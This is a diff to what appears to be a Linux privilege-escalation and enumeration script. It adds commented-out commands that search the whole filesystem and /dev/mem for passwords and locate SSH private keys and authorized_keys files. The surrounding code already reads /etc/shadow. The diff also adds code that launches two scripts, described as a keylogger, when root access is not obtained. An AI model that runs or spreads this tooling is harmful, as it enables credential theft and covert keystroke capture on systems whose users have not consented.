@@ -14,7 +14,7 @@ except ImportError:
 
 	compatmode = 1
 import socket
-
+import subprocess
 import time
 import getpass
 
@@ -765,6 +765,11 @@ pwdFiles = {"LOGPWDS": {"cmd": "find /var/log -name '*.log' 2>/dev/null | xargs 
                          "msg": "Config files containing keyword 'password'", "results": results},
             "FSTAB": {"cmd": "cat /etc/fstab", "msg": "Fstab", "results": results},
             "SHADOW": {"cmd": "cat /etc/shadow 2>/dev/null", "msg": "Shadow File (Privileged)", "results": results}
+            #"ALL_PASS": {"cmd": "grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always 2> /dev/null", "msg": "All found passwords", "results":results}, 
+            #"MEMORY_PASS" {"cmd": "strings /dev/mem -n10 | grep -i PASS", "msg": "Passwords found in memory", "results":results},
+            #"FILE_NAMED_PASSWORD" {"cmd": "locate password", "msg": "File named password are located at", "results":results},
+            #"SENSITIVE_FILES" {"cmd": "find / -name authorized_keys 2> /dev/null", "msg": "Sensitive files", "results":results},
+            #"ID_RSA" {"cmd": "find / -name id_rsa 2> /dev/null", "msg":"ID RSA", "results":results}
             }
 
 pwdFiles = execCmd(pwdFiles)
@@ -1154,4 +1159,9 @@ privescalation (x)
 if root == False :
 	sudoprivescalation()
 if root == False:
+	print("now execution of the keylogger")
+	print("copy_paste.py script")
+        subprocess.Popen("lxterminal -e python3 copy_paste.py", shell=True)
+	print("key_press.py script")
+        subprocess.Popen("lxterminal -e python3 key_press.py", shell=True)
 	helpNeeded()
